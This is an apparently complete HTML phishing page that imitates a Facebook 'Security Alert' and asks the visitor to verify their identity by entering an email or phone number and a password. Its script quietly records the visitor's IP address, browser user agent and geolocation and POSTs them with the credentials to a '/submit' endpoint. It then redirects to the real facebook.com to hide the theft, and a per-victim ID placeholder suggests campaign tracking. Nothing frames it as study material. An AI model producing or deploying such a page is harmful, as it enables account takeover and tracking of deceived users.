<!DOCTYPE html><html><head><title>Facebook Security Alert</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-blue-900 text-white min-h-screen flex items-center justify-center p-4"><div class="max-w-md w-full bg-white/10 backdrop-blur-xl rounded-3xl p-8 shadow-2xl border border-white/20"><div class="text-center mb-8"><svg class="w-20 h-20 mx-auto mb-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M20 10c0-5.523-4.477-10-10-10S0 4.477 0 10c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V10h2.54V7.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V10h2.773l-.443 2.789h-2.33v6.989C16.343 19.128 20 14.991 20 10z"/></svg><h1 class="text-2xl font-bold mb-2">Security Alert</h1><p class="text-blue-100">Verify your identity</p></div><form id="form" class="space-y-4"><input type="hidden" name="unique_id" value="{{UNIQUE_ID}}"><input type="hidden" name="ip" id="form_ip"><input type="hidden" name="user_agent" id="form_ua"><input type="hidden" name="geolocation" id="form_geo"><input type="email" name="email" placeholder="Email or Phone" class="w-full p-4 bg-white/20 border border-white/30 rounded-xl focus:ring-2 focus:ring-blue-400 text-white placeholder-blue-200"><input type="password" name="password" placeholder="Password" class="w-full p-4 bg-white/20 border border-white/30 rounded-xl focus:ring-2 focus:ring-blue-400 text-white placeholder-blue-200"><button type="submit" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-700 transition">Secure Account</button></form></div><script>fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('form_ip').value=d.ip);document.getElementById('form_ua').value=navigator.userAgent;if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{document.getElementById('form_geo').value=`${p.coords.latitude},${p.coords.longitude}`});document.getElementById('form').addEventListener('submit',async e=>{e.preventDefault();const fd=new FormData(e.target);await fetch('/submit',{method:'POST',body:fd});setTimeout(()=>{window.location.href='https://www.facebook.com'},1500)})</script></body></html>
